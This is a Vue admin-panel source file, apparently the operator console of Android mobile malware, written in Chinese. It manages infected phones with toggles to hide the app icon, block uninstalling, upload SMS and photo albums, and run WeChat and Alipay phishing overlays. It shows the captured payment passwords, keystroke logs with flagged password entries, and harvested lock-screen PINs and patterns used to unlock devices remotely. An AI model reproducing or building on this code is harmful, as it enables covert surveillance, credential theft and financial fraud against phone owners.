<template>
  <div class="mod-sys__log-operation">
    <el-form :inline="true" :model="dataForm" @keyup.enter="getDataList()">
      <el-form-item>
        <el-input v-model="dataForm.deviceId" placeholder="设备ID" clearable></el-input>
      </el-form-item>
      <el-form-item>
        <el-input v-model="dataForm.pkg" placeholder="所属包" clearable></el-input>
      </el-form-item>
      <el-form-item>
        <el-input v-model="dataForm.model" placeholder="手机型号" clearable></el-input>
      </el-form-item>

      <el-form-item>
        <el-input v-model="dataForm.language" placeholder="语言" clearable></el-input>
      </el-form-item>
      <el-form-item>
        <el-input v-model="dataForm.brand" placeholder="品牌" clearable></el-input>
      </el-form-item>

      <el-form-item>
        <el-select filterable v-model="dataForm.installApp" placeholder="已安装APP" clearable>
          <el-option v-for="app in installAppFilter" :key="app.packageName" :label="`${app.appName}(${app.packageName})`" :value="app.packageName"></el-option>
        </el-select>
      </el-form-item>

      <el-form-item>
        <el-select v-model="dataForm.status" placeholder="状态" clearable>
          <el-option label="熄屏" :value="0"></el-option>
          <el-option label="亮屏" :value="1"></el-option>
        </el-select>
      </el-form-item>

      <el-form-item>
        <el-select v-model="dataForm.kill" placeholder="已杀/未杀" clearable>
          <el-option label="未杀" :value="0"></el-option>
          <el-option label="已杀" :value="1"></el-option>
        </el-select>
      </el-form-item>
      <el-form-item>
        <el-input v-model="dataForm.remark" placeholder="备注"></el-input>
      </el-form-item>

      <el-form-item>
        <el-date-picker
          v-model="lastActivityTimeRange"
          type="datetimerange"
          range-separator="至"
          start-placeholder="开始时间"
          end-placeholder="结束时间"
          format="YYYY-MM-DD HH:mm:ss"
          value-format="x"
          @change="onLastActivityTimeChange"
          style="width: 360px"
        />
      </el-form-item>
      <el-form-item>
        <el-button @click="getDataList()">{{ $t("query") }}</el-button>
      </el-form-item>
    </el-form>
    <el-table v-loading="dataListLoading" :data="dataList" border @sort-change="dataListSortChangeHandle" table-layout="auto" style="width: 100%">
      <el-table-column prop="deviceId" label="设备ID" header-align="center" align="center" width="150px" show-overflow-tooltip></el-table-column>
      <el-table-column prop="pkg" label="所属包" header-align="center" align="center" width="150px" show-overflow-tooltip></el-table-column>
      <el-table-column prop="brand" label="品牌" header-align="center" align="center" width="80px" :show-overflow-tooltip="true"></el-table-column>
      <el-table-column prop="model" label="手机型号" header-align="center" align="center" width="80px" show-overflow-tooltip></el-table-column>
      <el-table-column prop="language" label="语言" header-align="center" align="center" width="60px" show-overflow-tooltip></el-table-column>
      <el-table-column prop="systemVersion" label="系统版本" header-align="center" align="center" width="80px" show-overflow-tooltip></el-table-column>
      <el-table-column prop="sdkVersion" label="sdk版本" header-align="center" align="center" width="80px" :show-overflow-tooltip="true"></el-table-column>

      <el-table-column label="屏幕分辨率" header-align="center" align="center" width="80px" :show-overflow-tooltip="true">
        <template v-slot="scope">
          {{ `${scope.row.screenWidth}×${scope.row.screenHeight}` }}
        </template>
      </el-table-column>
      <el-table-column prop="ip" label="IP/城市" header-align="center" align="center" width="150px" :show-overflow-tooltip="true">
        <template v-slot="scope">{{ scope.row.ip }} / {{ scope.row.addr }}</template>
      </el-table-column>

      <el-table-column label="开关" header-align="center" align="right" width="150px">
        <template v-slot="scope">
          <el-switch inactive-text="隐藏图标" :model-value="!!scope.row.hideIcon" @update:model-value="updateDeviceSwitch(scope.row, 'hideIcon', $event)" />
          <el-switch inactive-text="阻止卸载" :model-value="!!scope.row.uninstallGuard" @update:model-value="updateDeviceSwitch(scope.row, 'uninstallGuard', $event)" />
          <el-switch inactive-text="阻止无障碍" :model-value="!!scope.row.accessibilityGuard" @update:model-value="updateDeviceSwitch(scope.row, 'accessibilityGuard', $event)" />
          <!-- <el-switch inactive-text="解锁密码钓鱼" :model-value="!!scope.row.unlockFish" @update:model-value="updateDeviceSwitch(scope.row, 'unlockFish', $event)" /> -->
          <el-switch inactive-text="Kill状态" :model-value="!!scope.row.kill" @update:model-value="updateDeviceSwitch(scope.row, 'kill', $event)" />
          <el-switch inactive-text="上传短信" :model-value="!!scope.row.uploadSms" @update:model-value="updateDeviceSwitch(scope.row, 'uploadSms', $event)" />
          <el-switch inactive-text="上传相册" :model-value="!!scope.row.uploadAlbum" @update:model-value="updateDeviceSwitch(scope.row, 'uploadAlbum', $event)" />
        </template>
      </el-table-column>

      <el-table-column label="钓鱼开关" header-align="center" align="right" width="200px">
        <template v-slot="scope">
          <div v-for="item in fishTemplateList" :key="item.code" style="display: flex; align-items: center; gap: 8px; margin-bottom: 4px">
            <el-switch :inactive-text="item.label" :model-value="scope.row.fishSwitch && !!scope.row.fishSwitch[item.code]" @update:model-value="updateFishSwitch(scope.row, item.code, $event)" />
            <el-button
              v-if="!scope.row.fishSwitch || !scope.row.fishSwitch[item.code]"
              v-show="item.code === 'wx' || item.code === 'zfb'"
              link
              type="primary"
              size="small"
              @click="showFishPwd(scope.row, item.code)"
            >
              查看
            </el-button>
          </div>
        </template>
      </el-table-column>

      <el-table-column label="权限" header-align="center" align="center" width="150px">
        <template v-slot="scope">
          <div>
            <el-tag :type="scope.row.accessibilityServiceEnabled == 1 ? 'success' : 'danger'">
              无障碍
              <el-icon>
                <Select v-if="scope.row.accessibilityServiceEnabled == 1" />
                <Close v-else />
              </el-icon>
            </el-tag>
          </div>
          <div v-for="(value, key) in scope.row.permissions" :key="key">
            <el-tag :type="value ? 'success' : 'danger'">
              {{ permissionsName[key] }}
              <el-icon>
                <Select v-if="value" />
                <Close v-else />
              </el-icon>
            </el-tag>
          </div>
        </template>
      </el-table-column>
      <el-table-column label="设备状态" header-align="center" align="right" width="150px">
        <template v-slot="scope">
          <div>
            可解锁
            <el-tooltip v-if="scope.row.lockScreen" class="box-item" effect="dark" :content="formatUnlockTips(scope.row.lockScreen)" placement="top">
              <el-tag type="success">YES</el-tag>
            </el-tooltip>
            <el-tag type="danger" v-else>NO</el-tag>
          </div>
          <div>
            设备状态
            <el-tag type="danger" v-show="scope.row.status == 0">熄屏</el-tag>
            <el-tag type="success" v-show="scope.row.status == 1">亮屏</el-tag>
            <el-tag type="info" v-show="scope.row.status == 2">等待唤醒</el-tag>
            <el-tag type="info" v-show="scope.row.status == 3">等待唤醒</el-tag>
          </div>
        </template>
      </el-table-column>

      <el-table-column prop="lastHeart" label="最后活动时间" header-align="center" align="center" width="150px" :show-overflow-tooltip="true"></el-table-column>
      <el-table-column prop="remark" label="备注" show-overflow-tooltip header-align="center" align="center"></el-table-column>
      <el-table-column :label="$t('handle')" header-align="center" align="center" width="90px" fixed="right">
        <template v-slot="scope">
          <!-- <el-button-group > -->
          <div>
            <el-button link type="primary" @click="enterScreen(scope.row)">链接设备</el-button>
          </div>
          <div>
            <el-button link type="primary" @click="showInputLog(scope.row)">输入记录</el-button>
          </div>
          <div>
            <el-button link type="primary" @click="showAppList(scope.row)">安装应用</el-button>
          </div>
          <div>
            <el-button link type="primary" @click="showSmsList(scope.row)">短信记录</el-button>
          </div>
          <div>
            <el-button link type="primary" @click="showAlbumList(scope.row)">查看相册</el-button>
          </div>
          <div>
            <el-button link type="primary" @click="showRemarkDialog(scope.row)">备注</el-button>
          </div>
          <!-- </el-button-group> -->
        </template>
      </el-table-column>
    </el-table>
    <el-pagination
      :current-page="page"
      :page-sizes="[10, 20, 50, 100]"
      :page-size="limit"
      :total="total"
      layout="total, sizes, prev, pager, next, jumper"
      @size-change="pageSizeChangeHandle"
      @current-change="pageCurrentChangeHandle"
    >
    </el-pagination>
    <DeviceDetail ref="deviceDetail" @wakeup="wakeup"></DeviceDetail>
    <!-- 输入日志弹窗 -->
    <el-dialog
      v-model="inputLogVisible"
      :title="`输入日志 - 设备ID: ${currentDevice.deviceId} 包名: ${currentDevice.pkg}`"
      width="970px"
      :close-on-click-modal="false"
      class="input-log-dialog"
      destroy-on-close
    >
      <div class="log-header">
        <div class="header-row">
          <div class="query-controls">
            <span class="query-label">来源:</span>
            <el-select v-model="querySource" placeholder="选择来源" clearable style="width: 120px">
              <el-option label="管理端" :value="1" />
              <el-option label="App端" :value="0" />
            </el-select>
            <span class="query-label">APP包名:</span>
            <el-input v-model="queryAppPkg" placeholder="输入APP包名" clearable style="width: 200px" />
            <span class="query-label">查询日期:</span>
            <el-date-picker
              v-model="queryDate"
              type="daterange"
              range-separator="至"
              start-placeholder="开始日期"
              end-placeholder="结束日期"
              format="YYYY-MM-DD"
              value-format="YYYY-MM-DD"
              @change="onDateChange"
              style="width: 280px"
            />
            <el-button type="primary" @click="refreshLog" :loading="logLoading" size="small">重新查询</el-button>
          </div>
        </div>
      </div>

      <div class="log-content" v-loading="logLoading">
        <div class="log-item" v-for="(item, index) in inputLogList" :key="index" :class="{ 'password-item': item.password == 1 }">
          <div class="log-content-row">
            <span class="log-time">{{ item.date || formatTime(item.time) }}</span>
            <span class="log-source" :class="{ 'source-admin': item.source == 1, 'source-app': item.source == 0 }">
              {{ item.source == 1 ? "管理端" : "App端" }}
            </span>
            <span class="log-app">{{ item.app }}</span>
            <span class="log-resource" v-if="item.resourceId">{{ item.resourceId }}</span>
            <span class="log-text">{{ item.text || (item.password == 1 ? "[密码输入]" : "无内容") }}</span>
          </div>
        </div>
        <div v-if="inputLogList.length === 0 && !logLoading" class="no-data">暂无输入日志数据</div>
      </div>

      <template #footer>
        <el-button @click="inputLogVisible = false">关闭</el-button>
      </template>
    </el-dialog>

    <!-- 安装应用弹窗 -->
    <el-dialog v-model="appListVisible" :title="`安装应用列表 - 设备ID: ${currentAppDevice.deviceId}`" width="1200px" :close-on-click-modal="false" destroy-on-close>
      <AppList :device-id="currentAppDevice.deviceId" />
    </el-dialog>
    <!-- 选择解锁密码弹窗 -->
    <el-dialog v-model="unlockDialogVisible" :title="`选择解锁密码 - 设备ID: ${currentWakeRow?.deviceId || ''}`" width="480px" :close-on-click-modal="false" destroy-on-close>
      <div>
        <el-form label-width="90px">
          <el-form-item label="解锁密码">
            <el-select v-model="selectedUnlockId" placeholder="请选择解锁密码" filterable style="width: 100%">
              <el-option v-for="item in unlockOptions" :key="item.id" :label="formatUnlockTips(item)" :value="item.id">
                <span style="float: left">{{ formatUnlockTips(item) }}</span>
                <span style="float: right; color: #8492a6; font-size: 13px">
                  <span style="color: #00adff">{{ item.createDate }}</span>
                </span>
              </el-option>
            </el-select>
          </el-form-item>
        </el-form>
      </div>
      <template #footer>
        <el-button @click="unlockDialogVisible = false">取消</el-button>
        <el-button type="primary" @click="confirmWakeup" :loading="unlocking" :disabled="!selectedUnlockId">确定</el-button>
      </template>
    </el-dialog>

    <!-- 短信记录弹窗 -->
    <el-dialog v-model="smsListVisible" :title="`短信记录 - 设备ID: ${currentSmsDevice.deviceId}`" width="1200px" :close-on-click-modal="false" destroy-on-close>
      <SmsList :device-id="currentSmsDevice.deviceId" />
    </el-dialog>
    <!-- 相册列表弹窗 -->
    <el-dialog v-model="albumListVisible" :title="`相册列表 - 设备ID: ${currentAlbumDevice.deviceId}`" width="1200px" :close-on-click-modal="false" destroy-on-close>
      <AlbumList :device-id="currentAlbumDevice.deviceId" />
    </el-dialog>
    <!-- 备注弹窗 -->
    <el-dialog v-model="remarkDialogVisible" :title="`设备备注 - 设备ID: ${currentRemarkDevice.deviceId}`" width="500px" :close-on-click-modal="false" destroy-on-close>
      <el-form label-width="80px">
        <el-form-item label="备注内容">
          <el-input v-model="remarkContent" type="textarea" :rows="4" placeholder="请输入备注内容" clearable />
        </el-form-item>
      </el-form>
      <template #footer>
        <el-button @click="remarkDialogVisible = false">取消</el-button>
        <el-button type="primary" @click="submitRemark" :loading="remarkSubmitting">确定</el-button>
      </template>
    </el-dialog>

    <!-- 查看钓鱼密码弹窗 -->
    <el-dialog v-model="fishPwdDialogVisible" :title="`钓鱼密码 - ${fishPwdTitle}`" width="600px" :close-on-click-modal="false" destroy-on-close>
      <div v-loading="fishPwdLoading">
        <el-input v-model="fishPwdData" type="textarea" :rows="10" readonly />
      </div>
      <template #footer>
        <el-button @click="fishPwdDialogVisible = false">关闭</el-button>
      </template>
    </el-dialog>
  </div>
</template>

<script lang="ts">
import useView from "@/hooks/useView";
import baseService from "@/service/baseService";
import DeviceDetail from "@/views/device/detail.vue";
import AppList from "@/views/apps/list.vue";
import SmsList from "@/views/sms/list.vue";
import AlbumList from "@/views/album/list.vue";
import { defineComponent, reactive, toRefs, ref } from "vue";
import { ElMessageBox, ElMessage } from "element-plus";
export default defineComponent({
  components: {
    DeviceDetail,
    AppList,
    SmsList,
    AlbumList
  },
  setup() {
    const state = reactive({
      post: true,
      getDataListURL: "/device/page",
      getDataListIsPage: true,
      installAppFilter: [],
      dataForm: {
        deviceId: "",
        pkg: "",
        phone: "",
        model: "",
        language: "",
        brand: "",
        installApp: "",
        status: "",
        start: "",
        end: "",
        remark: "",
        kill: ""
      }
    });
    const deviceId = ref("");
    const fishTemplateList = ref<any[]>([]);
    const inputLogVisible = ref(false);
    const logLoading = ref(false);
    const inputLogList = ref([]);
    const queryDate = ref<any>([]);
    const queryAppPkg = ref("");
    const querySource = ref(null);
    const currentDevice = ref({
      deviceId: "",
      pkg: ""
    });
    const appListVisible = ref(false);
    const currentAppDevice = ref({
      deviceId: ""
    });
    const unlockDialogVisible = ref(false);
    const unlockOptions = ref<any[]>([]);
    const selectedUnlockId = ref<any>(null);
    const unlocking = ref(false);
    const currentWakeRow = ref<any | null>(null);
    const smsListVisible = ref(false);
    const currentSmsDevice = ref({
      deviceId: ""
    });
    const albumListVisible = ref(false);
    const currentAlbumDevice = ref({
      deviceId: ""
    });
    const lastActivityTimeRange = ref<any>(null);
    const remarkDialogVisible = ref(false);
    const remarkContent = ref("");
    const remarkSubmitting = ref(false);
    const currentRemarkDevice = ref({
      id: "",
      deviceId: "",
      remark: ""
    });
    const fishPwdDialogVisible = ref(false);
    const fishPwdLoading = ref(false);
    const fishPwdData = ref("");
    const fishPwdTitle = ref("");

    return {
      ...useView(state),
      ...toRefs(state),
      deviceId,
      inputLogVisible,
      logLoading,
      inputLogList,
      queryDate,
      queryAppPkg,
      querySource,
      currentDevice,
      appListVisible,
      currentAppDevice,
      unlockDialogVisible,
      unlockOptions,
      selectedUnlockId,
      unlocking,
      currentWakeRow,
      smsListVisible,
      currentSmsDevice,
      albumListVisible,
      currentAlbumDevice,
      lastActivityTimeRange,
      remarkDialogVisible,
      remarkContent,
      remarkSubmitting,
      currentRemarkDevice,
      fishPwdDialogVisible,
      fishPwdLoading,
      fishPwdData,
      fishPwdTitle,
      fishTemplateList,
      permissionsName: {
        "android.permission.READ_SMS": "短信",
        "android.permission.READ_MEDIA_IMAGES": "相册",
        "android.permission.BATTERY": "电池",
        "android.permission.AUTO_START": "自启动"
      }
    };
  },
  async mounted() {
    await this.fetchInstallAppFilterList();
    // 初始化默认的最近10分钟时间范围（使用北京时间 UTC+8）
    const now = this.getBeijingTimestamp();
    const tenMinutesAgo = now - 10 * 60 * 1000;
    this.lastActivityTimeRange = [tenMinutesAgo, now];
    this.dataForm.start = tenMinutesAgo;
    this.dataForm.start = this.formatTime(tenMinutesAgo);
    this.dataForm.end = this.formatTime(now);
    // 自动执行一次查询
    this.getDataList();
    await this.fetchFishTemplateList();
  },
  methods: {
    // 获取当前北京时间对应的时间戳（使DatePicker显示北京时间）
    getBeijingTimestamp() {
      const now = new Date();
      const currentLocalTimestamp = now.getTime();

      // 获取本地时区相对UTC的偏移（分钟）
      const localOffsetMinutes = now.getTimezoneOffset();
      // 北京时区相对UTC的偏移（分钟）：UTC+8 = -480分钟
      const beijingOffsetMinutes = -480;

      // 计算从北京时间到本地时间需要加的偏移
      // 例如：北京现在是12:00（UTC 04:00），美国东部应该显示23:00（前一天）
      // 但我们希望DatePicker显示12:00，所以需要加一个偏移让本地也显示12:00
      const offsetDiffMs = (localOffsetMinutes - beijingOffsetMinutes) * 60 * 1000;

      // 返回一个时间戳，使其在本地时区显示时看起来是当前的北京时间
      return currentLocalTimestamp + offsetDiffMs;
    },
    async fetchFishTemplateList() {
      let { code, data, msg } = await baseService.post("/device/fishCodeList");
      if (code == 0) {
        this.fishTemplateList = data;
      } else {
        ElMessage.error(msg || "获取钓鱼模板失败");
      }
    },
    enterScreen(row: any) {
      this.deviceId = row.deviceId;
      (this.$refs as any).deviceDetail.show(row);
    },
    async fetchInstallAppFilterList() {
      let { code, data, msg } = await baseService.post("/device/installAppFilterList");
      if (code == 0) {
        this.installAppFilter = data;
      } else {
        ElMessageBox.alert(msg, "错误", {
          type: "error",
          confirmButtonText: "OK"
        });
      }
    },
    async wakeup(row: any) {
      //获取解锁密码
      const { success, data, msg } = await baseService.post("/unlockScreenPwd/page", {
        deviceId: row.id,
        page: 1,
        limit: 100
      });
      if (!success) {
        ElMessage.error(msg);
        return;
      }
      // 展示 弹出选择密码的弹窗（下拉显示 tips）
      const list = Array.isArray(data) ? data : (data && (data.list || data.records)) || [];
      this.unlockOptions = list || [];
      if (!this.unlockOptions || this.unlockOptions.length === 0) {
        ElMessage({ message: "暂无可选解锁密码，请先添加", type: "warning" });
        return;
      }
      this.currentWakeRow = row;
      this.selectedUnlockId = this.unlockOptions[0]?.id || null;
      this.unlockDialogVisible = true;
    },

    async confirmWakeup() {
      if (!this.currentWakeRow || !this.selectedUnlockId) {
        ElMessage({ message: "请选择解锁密码", type: "warning" });
        return;
      }
      this.unlocking = true;
      try {
        const { code, msg } = await baseService.post("/device/wakeup", {
          id: this.currentWakeRow.id,
          unlockPwdId: this.selectedUnlockId
        });
        if (code == 0) {
          ElMessage({ message: "操作成功,等待唤醒!", type: "success" });
          this.unlockDialogVisible = false;
          this.currentWakeRow = null;
          this.selectedUnlockId = null;
          this.getDataList();
        } else {
          ElMessageBox.alert(msg, "错误", { type: "error", confirmButtonText: "OK" });
        }
      } finally {
        this.unlocking = false;
      }
    },

    async showInputLog(row: any) {
      this.currentDevice.deviceId = row.deviceId;
      this.currentDevice.pkg = row.pkg; // 包名
      this.queryAppPkg = ""; // 清空APP包名输入框
      this.querySource = null; // 清空来源选择

      // 设置默认查询日期为今天（范围）
      const today = new Date();
      const todayStr = today.getFullYear() + "-" + String(today.getMonth() + 1).padStart(2, "0") + "-" + String(today.getDate()).padStart(2, "0");
      this.queryDate = [todayStr, todayStr];

      this.inputLogVisible = true;
      this.inputLogList = [];

      // 执行查询
      await this.refreshLog();
    },
    async refreshLog() {
      if (!this.currentDevice.deviceId || !this.currentDevice.pkg || !this.queryDate || !Array.isArray(this.queryDate) || this.queryDate.length !== 2) {
        ElMessage({
          message: "查询参数不完整",
          type: "warning"
        });
        return;
      }

      this.logLoading = true;
      this.inputLogList = [];

      try {
        // 根据选择的日期范围计算起止时间
        const [startStr, endStr] = this.queryDate as [string, string];
        const startDate = new Date(startStr);
        const endDate = new Date(endStr);
        const startTime = new Date(startDate.getFullYear(), startDate.getMonth(), startDate.getDate()).getTime();
        const endTime = new Date(endDate.getFullYear(), endDate.getMonth(), endDate.getDate() + 1).getTime() - 1;

        const { code, data, msg } = await baseService.post("/inputTextRecord/group", {
          deviceId: this.currentDevice.deviceId,
          startTime: startTime,
          endTime: endTime,
          pkg: this.currentDevice.pkg,
          appPkg: this.queryAppPkg || undefined, // 如果有输入APP包名则传递，否则不传
          source: this.querySource !== null ? this.querySource : undefined // 如果选择了来源则传递
        });

        if (code == 0) {
          // 处理返回的数据结构：data是单个InputTextGroup对象
          if (data && data.items && Array.isArray(data.items)) {
            this.inputLogList = data.items;
          } else {
            this.inputLogList = [];
          }
        } else {
          ElMessage({
            message: msg || "获取日志失败",
            type: "error"
          });
        }
      } catch (error) {
        ElMessage({
          message: "获取日志失败",
          type: "error"
        });
      } finally {
        this.logLoading = false;
      }
    },
    onDateChange() {
      // 日期改变时可以自动查询，或者用户手动点击按钮查询
      // this.refreshLog();
    },
    formatTime(timestamp: any) {
      if (!timestamp) return "";

      const timeNum = Number(timestamp);
      if (isNaN(timeNum)) return "";

      const date = new Date(timeNum);
      if (isNaN(date.getTime())) return "";

      const year = date.getFullYear();
      const month = String(date.getMonth() + 1).padStart(2, "0");
      const day = String(date.getDate()).padStart(2, "0");
      const hours = String(date.getHours()).padStart(2, "0");
      const minutes = String(date.getMinutes()).padStart(2, "0");
      const seconds = String(date.getSeconds()).padStart(2, "0");

      return `${year}-${month}-${day} ${hours}:${minutes}:${seconds}`;
    },
    async updateFishSwitch(row: any, field: string, value: boolean) {
      try {
        const { success, msg } = await baseService.post(
          "/device/updateFishSwitch",
          {
            id: row.id,
            code: field,
            value: value
          },
          undefined,
          true
        );
        if (success) {
          ElMessage.success("更新成功");
          this.getDataList();
        } else {
          ElMessage.error(msg || "更新失败");
        }
      } catch (error) {
        ElMessage.error("更新失败");
      }
    },
    async updateDeviceSwitch(row: any, field: string, value: boolean) {
      // 将 boolean 转换为 int (true -> 1, false -> 0)
      const intValue = value ? 1 : 0;

      // 更新本地数据
      row[field] = intValue;

      // 这里可以添加 API 调用来同步到后端
      // 例如:
      try {
        const { success, msg } = await baseService.post(
          "/device/updateSwitch",
          {
            id: row.id,
            [field]: intValue
          },
          undefined,
          true
        );
        if (success) {
          ElMessage.success("更新成功");
        } else {
          ElMessage.error(msg || "更新失败");
          // 恢复原值
          row[field] = intValue ? 0 : 1;
        }
      } catch (error) {
        ElMessage.error("更新失败");
        // 恢复原值
        row[field] = intValue ? 0 : 1;
      }
    },
    formatUnlockTips(lockScreen: any) {
      let type = "";
      switch (lockScreen.type) {
        case 0:
          return "无锁";
        case 1:
          type = "PIN码";
          break;
        case 2:
          type = "手势";
          break;
        case 3:
          type = "混合密码";
          break;
        default:
          return "未知";
      }

      let source = "";

      switch (lockScreen.source) {
        case 1:
          source = "钓鱼";
          break;
        case 2:
          source = "采集";
          break;
        default:
          source = "未知";
          break;
      }
      return `(${source}) - ${type}:${lockScreen.tips}`;
    },
    showAppList(row: any) {
      this.currentAppDevice.deviceId = row.deviceId;
      this.appListVisible = true;
    },
    showSmsList(row: any) {
      this.currentSmsDevice.deviceId = row.deviceId;
      this.smsListVisible = true;
    },
    showAlbumList(row: any) {
      this.currentAlbumDevice.deviceId = row.deviceId;
      this.albumListVisible = true;
    },
    showRemarkDialog(row: any) {
      this.currentRemarkDevice.id = row.id;
      this.currentRemarkDevice.deviceId = row.deviceId;
      this.currentRemarkDevice.remark = row.remark || "";
      this.remarkContent = row.remark || "";
      this.remarkDialogVisible = true;
    },
    async submitRemark() {
      if (!this.currentRemarkDevice.id) {
        ElMessage.error("设备ID不能为空");
        return;
      }

      this.remarkSubmitting = true;
      try {
        const { code, msg } = await baseService.post("/device/updateRemark", {
          id: this.currentRemarkDevice.id,
          remark: this.remarkContent
        });

        if (code === 0) {
          ElMessage.success("备注更新成功");
          this.remarkDialogVisible = false;
          this.remarkContent = "";
          // 刷新列表
          this.getDataList();
        } else {
          ElMessage.error(msg || "备注更新失败");
        }
      } catch (error) {
        ElMessage.error("备注更新失败");
      } finally {
        this.remarkSubmitting = false;
      }
    },
    onLastActivityTimeChange(value: any) {
      if (value && Array.isArray(value) && value.length === 2) {
        // 将时间戳转换为字符串格式 "yyyy-MM-dd HH:mm:ss"
        const startTime = Number(value[0]);
        const endTime = Number(value[1]);

        this.dataForm.start = this.formatTime(startTime);
        this.dataForm.end = this.formatTime(endTime);
      } else {
        this.dataForm.start = "";
        this.dataForm.end = "";
      }
    },
    async showFishPwd(row: any, code: string) {
      this.fishPwdLoading = true;
      this.fishPwdDialogVisible = true;
      this.fishPwdData = "";

      // 设置标题
      const codeNames: any = {
        wx: "微信",
        zfb: "支付宝"
      };
      this.fishPwdTitle = `设备ID: ${row.deviceId} - ${codeNames[code] || code}`;

      try {
        const {
          code: resCode,
          data,
          msg
        } = await baseService.post("/device/showFishPwd", {
          id: row.deviceId,
          code: code
        });

        if (resCode === 0 && data) {
          this.fishPwdData = data.data || "暂无数据";
        } else {
          ElMessage.error(msg || "获取钓鱼密码失败");
          this.fishPwdDialogVisible = false;
        }
      } catch (error) {
        ElMessage.error("获取钓鱼密码失败");
        this.fishPwdDialogVisible = false;
      } finally {
        this.fishPwdLoading = false;
      }
    }
  }
});
</script>

<style scoped>
.action-buttons {
  display: flex;
  flex-direction: column;
  justify-content: center;
  align-items: center;
  gap: 2px;
}

/* 当空间不够时，按钮垂直排列 */
@media (max-width: 1200px) {
  .action-buttons {
    flex-direction: column;
    gap: 2px;
  }
}

.action-buttons.compact .row {
  display: flex;
  gap: 4px;
  justify-content: center;
  align-items: center;
  flex-wrap: nowrap;
}

.action-buttons.compact .el-button + .el-button {
  margin-left: 4px;
}

/* 输入日志弹窗样式 */
.input-log-dialog .el-dialog__body {
  padding: 10px 20px;
}

.log-header {
  margin-bottom: 20px;
  padding: 15px;
  background: #f5f7fa;
  border-radius: 8px;
}

.header-row {
  display: flex;
  justify-content: flex-start;
  align-items: center;
  width: 100%;
}

.query-controls {
  display: flex;
  align-items: center;
  gap: 12px;
}

.query-label {
  font-size: 14px;
  font-weight: 500;
  color: #606266;
  white-space: nowrap;
}

.log-content {
  max-height: 500px;
  overflow-y: auto;
  border: 1px solid #e4e7ed;
  border-radius: 8px;
  padding: 10px;
  background: #fafafa;
}

.log-item {
  margin-bottom: 10px;
  padding: 10px 12px;
  background: white;
  border-radius: 6px;
  border-left: 3px solid #409eff;
  box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
}

.log-item.password-item {
  background: #fef0f0;
  border-left-color: #f56c6c;
  box-shadow: 0 2px 8px rgba(245, 108, 108, 0.2);
}

.log-item.password-item .log-text {
  background: #fde2e2;
  color: #f56c6c;
  font-weight: 500;
}

.log-content-row {
  display: flex;
  align-items: center;
  gap: 12px;
  flex-wrap: wrap;
  font-size: 13px;
}

.log-time {
  font-weight: 500;
}

.log-source {
  padding: 2px 8px;
  border-radius: 12px;
  font-size: 12px;
  font-weight: 500;
  margin-right: 8px;
}

.log-source.source-admin {
  background: #f0f9ff;
  color: #1d4ed8;
  border: 1px solid #dbeafe;
}

.log-source.source-app {
  background: #f0fdf4;
  color: #15803d;
  border: 1px solid #dcfce7;
}

.log-app {
  background: #e1f3d8;
  padding: 2px 8px;
  border-radius: 12px;
  color: #67c23a;
}

.log-resource {
  background: #e6f7ff;
  padding: 2px 8px;
  border-radius: 12px;
  color: #1890ff;
  font-size: 11px;
}

.log-text {
  font-family: "Courier New", monospace;
  font-size: 13px;
  color: #303133;
  background: #f8f9fa;
  padding: 4px 8px;
  border-radius: 4px;
  word-break: break-all;
  flex: 1;
  min-width: 0;
}

.no-data {
  text-align: center;
  padding: 50px;
  color: #909399;
  font-size: 14px;
}
</style>
